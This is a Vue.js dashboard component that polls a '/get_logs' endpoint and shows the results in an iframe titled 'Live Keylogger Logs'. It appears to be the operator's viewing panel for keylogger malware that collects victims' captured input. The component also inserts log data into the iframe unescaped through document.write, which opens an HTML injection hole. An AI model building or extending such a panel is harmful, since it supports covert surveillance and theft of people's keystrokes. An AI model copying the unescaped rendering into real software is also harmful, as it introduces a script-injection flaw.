<template>
  <div>
    <p>
      <b-input-group prepend="Log Refresh Interval" class="mt-3">
        <b-form-input v-model="refresh_interval"></b-form-input>
        <b-input-group-append>
          <b-button
            variant="info"
            :disabled="log_loading"
            v-on:click="fetchLogs"
          >
            Fetch Logs
          </b-button>
        </b-input-group-append>
      </b-input-group>
    </p>
    <p>
      <iframe ref="log_viewer" width="100%" height="600px"></iframe>
    </p>
  </div>
</template>

<script>
import { api_request } from "./utils.js";

export default {
  name: "Dashboard",
  props: {
    id: {
      type: String,
      required: true,
    },
    ua: {
      type: String,
      required: true,
    },
  },
  data() {
    return {
      logs: [],
      log_loading: false,
      refresh_interval: 5000, // Default refresh time
    };
  },
  mounted() {
    this.fetchLogs(); // Fetch logs when mounted
    setInterval(this.fetchLogs, this.refresh_interval);
  },
  methods: {
    async fetchLogs() {
      this.log_loading = true;
      await api_request("GET", "/get_logs")
        .then((response) => {
          this.logs = response.logs || [];
          this.$toastr.s("Logs fetched successfully.");
          this.displayLogs();
        })
        .catch((error) => {
          this.$toastr.e(error.error || "Failed to fetch logs.");
        })
        .finally(() => {
          this.log_loading = false;
        });
    },
    displayLogs() {
      const iframe = this.$refs.log_viewer;
      const iframeDocument = iframe.contentDocument || iframe.contentWindow.document;

      iframeDocument.open();
      iframeDocument.write(this.formatLogs());
      iframeDocument.close();
    },
    formatLogs() {
      return `
        <html>
          <head>
            <style>
              body { font-family: Arial, sans-serif; padding: 10px; }
              ul { list-style-type: none; padding: 0; }
              li { padding: 5px; border-bottom: 1px solid #ddd; }
            </style>
          </head>
          <body>
            <h2>Live Keylogger Logs</h2>
            <ul>
              ${this.logs.map(log => `<li>[${log.timestamp}] <strong>${log.type}</strong>: ${log.data}</li>`).join('')}
            </ul>
          </body>
        </html>`;
    },
  },
};
</script>

<style scoped>
/* Add component-specific styles here */
</style>
